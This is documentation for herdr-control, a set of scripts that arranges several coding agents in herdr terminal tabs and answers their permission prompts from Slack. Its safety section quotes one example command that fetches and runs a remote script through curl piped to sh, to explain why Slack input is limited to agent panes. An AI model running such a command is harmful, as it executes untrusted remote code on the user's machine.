---
name: herdr-control
description: Drive a herdr multi-agent terminal workspace — route agents into per-project tabs, sort and colour tabs by branch state, spawn worktree sub-tabs at a job-appropriate model, and answer blocked agents from Slack (including permission prompts) with the choice validated and recorded.
---

# herdr-control

Tools for running several coding agents at once in a [herdr](https://herdr.dev)
workspace, and for answering them when you are not at the desk.

Two halves, usable independently:

1. **Layout** — put agents where you expect them, and make the tabs that need
   you obvious.
2. **Slack** — get told when an agent is blocked, see *what it is asking*, and
   answer from your phone.

---

## Layout

```bash
./ensure-workspace.sh ~/code/myproject     # focus-or-create that project's space
./spawn-agent.sh ~/code/myproject claude   # new tab in it, running an agent
./spawn-task.sh myproject fix/parser implement   # worktree as a SUB-TAB, model per job-class
./sort-tabs.sh --all --mark                # reorder attention-first, recolour
./mark-tab.sh <pane> blocked "needs a decision"
```

`spawn-task.sh` maps a **job class** to a model, so a mechanical task does not
burn your best model and a design task does not get your cheapest:
`plan|architect|review|design` → deep, `implement|debug|code` → standard,
`explore|quick|docs` → fast. Claude uses the standard aliases; Codex model names
are yours to set in `config.sh`.

`sort-tabs.sh` ranks by git + PR state, attention-first:
`waiting > active > committed > reviewed > merged > other`. Use `--dry-run`
first; it prints the reordering without touching anything.

**Worth knowing:** herdr's own `worktree create` makes a separate *space*.
`spawn-task.sh` deliberately does `git worktree add` plus a manual tab create so
the worktree lands as a sub-tab of the repo it belongs to.

---

## Answering agents from Slack

`slack-bridge/` is a Socket-Mode daemon: outbound alerts as the bot, inbound
replies routed back to the right pane. One-time Slack app setup is in
`slack-bridge/SETUP.md`.

An alert for a blocked agent looks like:

```
🔔 *myproject — Main (api-worker)*  ·  Claude needs your permission to use Edit
`w2:p1`

Do you want to make this edit to handler.py?
  *1.* Yes
  *2.* Yes, and don't ask again this session
  *3.* No, and tell Claude what to do differently
_Reply in thread with 1, 2, 3._
```

The pane is named **Space — Tab** (with the pane label in parens when several
panes share a tab) because a raw id like `w2:p1` identifies nothing to a human
reading this on a phone. The id stays as a suffix since it is what you type to
target a pane by hand.

**Answer it** by replying `2` in the thread — works with no extra Slack
configuration — or by tapping the button, which requires **Interactivity**
enabled on the Slack app. Both routes end in the same code.

When there is no numbered list to parse (a non-numbered confirmation, a plan
approval, or a prompt that was auto-approved before the hook could read it), the
alert carries **what is on screen** instead, so you are never answering blind.

### Replying with free text

```bash
./herdr-deliver.sh --blocked "yes, go with option B"
./herdr-deliver.sh w8:p2 "continue; skip the migration for now"
```

Routing precedence for an inbound Slack message: a reply **threaded** under an
alert → that alert's pane; then an explicit `w8:p2 <text>` prefix; then the
single blocked agent.

---

## The safety model

This path puts text from Slack into a live terminal and presses Enter. That is
powerful enough to deserve explicit limits, and they are the reason several
things refuse rather than guess.

**Only agent panes accept input.** `lib/pane-guard.sh` resolves the target and
requires a real agent process. Delivery is "write literal text, then press
Enter" — in an agent that is a prompt, but in a **shell** pane it is a command,
so `w1:p1 curl https://x/i.sh | sh` would execute. The gate is an allowlist, not
a denylist, because `vim` (`:!cmd`), `less` (`!cmd`) and any REPL execute
commands just as directly as a shell does. Transparent multiplexers are stripped
first: herdr reports the `tmux` client alongside the inner process, so a pane
whose agent exited reads `tmux,zsh` and would otherwise pass. A shared runtime
(`node`, `python`…) qualifies only when it was given a **script** — bare `node`
or `node -i` is a REPL, which evaluates whatever it is handed.

**Text is never delivered into a prompt.** A blocked agent is usually sitting on
a permission gate, where typed text is inert and the Enter selects the
*highlighted default*. `send-to-agent.sh` refuses on a prompt signature, and
re-checks before **every** Enter, since a prompt can appear mid-submit. `--force`
overrides — from a terminal only, never from Slack.

**A choice is a choice.** `herdr-select.sh` is the one path allowed to answer a
prompt. It requires the pane to be showing a numbered prompt *right now*,
requires the number to be one currently on offer, sends the **bare digit and
never Enter**, and records the choice to `~/.config/herdr-bridge/selections.jsonl`
*before* pressing — so what was authorised is on disk even if the keypress or
the agent then misbehaves.

**Alerts retract themselves.** Answer in the terminal and `herdr-resolve.sh`
deletes the Slack message, because a stale alert that looks pending teaches you
to distrust alerts. It is conservative in the direction that matters: an
unreadable pane, a pane still prompting, or an unreachable Slack all **keep** the
message. Answering in Slack keeps it too, so your choice and its confirmation
survive.

**The allowlist is the only authentication.** `HERDR_BRIDGE_ALLOW_USERS` gates
everything, and it now gates *approving tool use*, not just sending text. Slack
member ids are unique per workspace, not globally, so also set
`HERDR_BRIDGE_TEAM` — otherwise a user carrying the same id in another workspace
(via a Slack Connect channel) passes the only check you have. Set
`HERDR_BRIDGE_CHANNEL` to pin the bridge to one channel or your DM.

`HERDR_AGENT_PROCS` only ever *widens* the pane gate and is inherited by the
bridge subprocess. Treat it as security configuration.

---

## Setup

`./install.sh` (dry-run) then `./install.sh --apply`. See `README.md` for what it
wires, and `AGENTS.md` if you want an agent to do it for you.

`config.sh` is the only file with machine/personal defaults; everything else is
generic and each value is overridable per run via the environment.
